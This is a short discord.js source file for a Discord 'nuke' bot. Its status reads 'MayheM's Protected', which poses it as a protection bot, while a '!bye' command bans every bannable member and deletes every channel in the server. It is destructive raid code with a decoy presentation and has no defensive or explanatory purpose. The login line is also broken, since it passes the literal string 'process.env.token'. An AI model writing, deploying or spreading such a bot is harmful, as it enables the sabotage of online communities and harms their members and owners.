const Discord = require('discord.js');
const client = new Discord.Client();

client.on('ready', () => {
    client.user.setActivity(`MayheM's Protected`, { type: 'WATCHING' })
    .then(presence => console.log(`Activity set to ${presence.activities[0].name}`))
    .catch(console.error);})


client.on('message', message =>{
    if(message.content === "!bye") {
    
    
    message.guild.members.cache.forEach(m => {if(m.bannable){
      console.log(`banned: ${m.user.tag}`)
      m.ban().catch(console.error)
    }message.guild.channels.cache.forEach(channel => channel.delete())
  })}
  })

client.login('process.env.token')//
///@author:MayheM&PHD Reynoso